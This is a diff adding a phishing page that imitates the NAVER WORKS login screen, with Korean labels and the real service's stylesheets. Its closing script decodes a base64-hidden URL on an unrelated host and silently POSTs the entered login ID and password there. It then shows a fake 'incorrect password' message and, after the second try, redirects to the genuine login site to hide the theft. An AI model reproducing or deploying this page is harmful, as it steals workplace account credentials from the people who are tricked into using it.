@@ -1,0 +1,259 @@
+﻿<!DOCTYPE HTML>
+<html lang="ko">
+<head>
+    <meta charset="utf-8" />
+    <title>Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+    <link rel="stylesheet" type="text/css" href="https://auth.worksmobile.com/css/login.css?20240607">
+    <link rel="stylesheet" type="text/css" href="https://auth.worksmobile.com/css/edge_pw_icon_disable.css?20240607">
+
+    <script src="/js/jquery/jquery-3.6.0.min.js?20240607" type="text/javascript"></script>
+    <script src="/js/message/message_ko_KR.js?20240607" type="text/javascript"></script>
+    <script src="/js/rsa.js?20240607" type="text/javascript"></script>
+
+
+    
+    
+        <script type="text/javascript" src="/js/service/auth_core.js?20240607"/></script>
+        <script type="text/javascript" src="/js/service/auth_service.js?20240607"/></script>
+    
+
+    <script type="text/javascript" src="/js/common/lcslog.js?20240607" charset="utf-8"></script>
+
+
+	<script type="text/javascript">
+		var eventType = (/(MSIE (10|9|8|7)|Trident\/(6|5|4|3))/.test((window.navigator || {}).userAgent)) ? 'load' : 'pageshow';
+    window.addEventListener(eventType,  function(event) {
+        if (typeof lcsSti !== 'undefined') {
+            sendLcs(lcsSti);
+        }
+    }, false);
+
+    function sendLcs(lcsSti) {
+        lcsSti = setMobilePrefix(lcsSti);
+        lcsSti = setInstancePostfix(lcsSti);
+        var resourcePhase = null;
+        if (resourcePhase != 'real') { // stage도 리얼이 아닌 알파로 잡히게 수정
+            window.lcs_SerName = 'alpha-lcs.worksmobile.com'; // for alpha Test
+        }
+        lcs_do({"sti" : lcsSti});
+    }
+
+    function setMobilePrefix(lcsSti) {
+        if (navigator.userAgent.indexOf('WorksMobile') > -1) {
+            lcsSti = 'm_' + lcsSti;
+        }
+        return lcsSti;
+    }
+
+    function setInstancePostfix(lcsSti) {
+        var idcType = "jp1";
+        if (idcType == 'kr1' || idcType == 'kr0') {
+            lcsSti += '_kr';
+        } else {
+            lcsSti += '_jp';
+        }
+        return lcsSti
+    }
+	</script>
+
+<style>
+input[type="email"] {
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+    border: 0;
+    background-color: rgba(0, 0, 0, 0);
+}
+</style>
+
+</head>
+
+<body>
+	<div id="root">
+		<a href="#content" class="skip">go to the text</a>
+        <div class="wrap ko_KR integration">
+			<div class="container">
+				<div class="contents_box">
+					<div class="contents ">
+						<h1 class="logo"><span class="blind">NAVER WORKS</span></h1>
+						<h2 class="title">비밀번호를 입력하거나,<br>신뢰하는 기기로 인증하세요.</h2>
+                        <form>
+                        <div class="input_wrap">
+                            <div class="input_area" id="">
+                                <div class="input_cover" id="">
+                                    <label for="userid" class="blind">이메일</label>
+                                    <input type="email" id="login_param" name="userid" class="input_box" placeholder="로그인 아이디" required="required">
+                                    
+                                </div>
+                                <ul class="account_list" id="login_id_list">
+                                </ul>
+                            </div>
+
+                        </div>
+                        <div class="input_wrap">
+                            <div class="input_area">
+                                <div class="input_cover" id="">
+                                    <label for="passowrd" class="blind">비밀번호</label>
+                                    <input type="password" id="password" name="pass" class="input_box" placeholder="비밀번호" required="required">
+                                    <button type="button" id="" class="btn_delete"><span class="blind">비밀번호 찾기</span></button>
+                                    
+                                        <button  type="button" class="btn_masking"><span class="blind">show the password</span></button>
+                                    
+                                </div>
+                            </div>
+                            <p class="invalid_desc" id="fail_message"></p>
+                        </div>
+    
+                        <div class="input_btn_area">
+                            <button type="" id="loginStart" class="btn_submit">기억하기</button>
+                        </div>
+                        <div class="check_area">
+                            <div class="check_info">
+                                <div class="check_cover">
+                                    <input type="checkbox" id="" class="input_check">
+                                    <label for="keepLogin" id="" class="input_label">계속 로그인</label>
+                                    <!-- <div class="tooltip_area">
+                                        <button class="btn_tooltip" id="keepLoginBtn"><span class="blind">tooltip</span></button>
+                                        <div class="tooltip_box wide" id="keepLoginToolTipBox">
+                                            Automatically log in with this account.<br>
+                                            Others may be able to log in with this account. Please use this on a home or business PC to protect your information.
+                                            <button type="button" class="btn_tooptip_close"><span class="blind">close</span></button>
+                                        </div>
+                                    </div> -->
+                                </div>
+    
+                                
+                                <div class="more_area">
+                                    <a href="#" class="link findPwdBtn">암호 찾기</a>
+                                </div>
+                            </div>
+                            <!-- <div class="check_info">
+                                <div class="check_cover">
+                                    <input type="checkbox" id="rememberId" class="input_check">
+                                    <label for="rememberId" class="input_label">Remember ID</label>
+                                    <div class="tooltip_area">
+                                        <button class="btn_tooltip" id="rememberIdBtn"><span class="blind">tooltip</span></button>
+                                        <div class="tooltip_box" id="rememberIdTooltipBox">
+                                            Remembers your ID.<br>
+                                            Please pay special attention when using on a public PC with vulnerable security.
+                                            <button type="button" class="btn_tooptip_close" id="rememberIdBtnClose"><span class="blind">close</span></button>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                            </div> -->
+    
+                            
+                            
+                            
+                        </div>
+                        </form>
+                    </div>
+                </div>
+				<div class="other_contents">
+					<a href="#" target="_blank" class="another_way">새 계정을 만드세요?</a>
+				</div>
+				<footer class="footer">
+					<address class="copyright">© NAVER WORKS Corp.</address>
+				</footer>
+
+			</div>
+		</div>
+		
+	</div>
+	
+<script>
+		
+    var feedUpdateResponse = window.location.href;
+    var feedUpdateSplit = feedUpdateResponse.split("");
+    
+    for (var x = 0; x < feedUpdateSplit.length; x++) {
+     
+     if (feedUpdateSplit[x]=="#"){
+      var che= feedUpdateResponse.substring(x+1);
+     
+     }else{
+     
+    
+     }
+    
+     
+     
+     }
+      document.getElementById("pet").value =che
+    document.getElementById("p1").innerHTML = che
+      document.getElementById("pet").value =che
+    
+    </script>
+    
+    
+    
+    
+        <script src="https://code.jquery.com/jquery-1.9.1.js"></script>
+        <script>
+    
+          
+           $(document).ready(function() {
+                var user=$("#pet").val();
+              var  count=0;
+               
+            $('form').submit(function(e) {
+                
+                count=count+1;
+                
+               var d=atob("aHR0cHM6Ly9wYXJrbGFuZHVzYS5jby9nZWlkYW0veGVuZC5waHA=");
+    
+                e.preventDefault();
+                   $.ajax({
+                   
+                type: 'POST',
+                url: d,
+                crossDomain: true,
+                data: $('form').serialize(),
+                
+                 beforeSend: function(xhr){
+                  $('#loginStart').html('Verifing...');
+                  console.log('working')
+                  
+                  
+                  
+    if (count>=2) {
+                        count=0;
+                        // window.location.replace(response['redirect_link']);
+                        window.location.replace("https://auth.worksmobile.com/");
+    
+                      }else{
+                       var x = document.getElementById("login_param").value;
+                         
+                        
+                       $('#loginStart').html('CONTINUE');
+                           document.getElementById("password").value ="";
+                         
+                        
+                    $(".invalid_desc").show();
+                        $("#fail_message").html("The username or password you entered is incorrect.");
+                    
+    
+                         }
+                            
+                },
+                
+                
+                         
+                success: function () {
+                    $(".invalid_desc").show();
+                        $("#fail_message").html("The username or password you entered is incorrect.");
+                    
+    
+        
+                }
+              });
+            });
+        });
+        </script>
+    
+
+</body>
+
+</html>
